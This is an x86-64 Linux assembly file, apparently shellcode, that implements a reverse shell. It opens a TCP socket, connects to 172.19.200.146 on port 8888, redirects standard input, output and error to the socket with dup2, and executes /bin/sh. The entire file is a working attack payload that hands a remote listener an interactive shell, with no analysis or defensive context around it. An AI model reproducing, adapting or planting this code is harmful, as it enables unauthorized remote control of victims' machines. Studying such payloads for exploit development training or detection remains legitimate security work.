global _start

section .text
    _start: 
                                        ; sock = socket(AF_INET, SOCK_STREAM, 0)
    xor rsi,rsi
	mov al,0x29                         ;#define __NR_socket 41
	mov dil,0x2                         ; AF_INET = 2                                                                             
    mov sil, 0x1                        ; SOCK_STREAM = 1
    xor rdx,rdx
    syscall
    
    mov rdi, rax                        ;sock = socket(AF_INET, SOCK_STREAM, 0)
    
    
                                        ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
    push rdx  
    mov dword [rsp+0x4],0x92c813ac      ; 172.19.200.146
	mov word [rsp+0x2],  0xb822         ; 8888
	mov byte [rsp],0x2
    mov dl,0x10                         ; sockaddr_len = 16
    mov rsi,rsp
    mov al, 0x2a
    syscall
    
 
  ;dup2(sock, 0);
  ;dup2(sock, 1);
  ;dup2(sock, 2);
  xor rsi,rsi
  dup2:
  mov al, 0x21
  syscall
  inc rsi
  cmp sil,0x3
  jnz dup2
  
  
  ;/bin/sh
  xor rax,rax
  ;excve("/bin/sh"0x0,[/bin/sh]0x0,0x0) 
  
  xor     rdx, rdx
  mov     qword rbx, '//bin/sh'
  shr     rbx, 0x8
  push    rbx
  mov     rdi, rsp
  push    rax
  push    rdi
  mov     rsi, rsp
  mov     al, 0x3b
  syscall
 
  
  
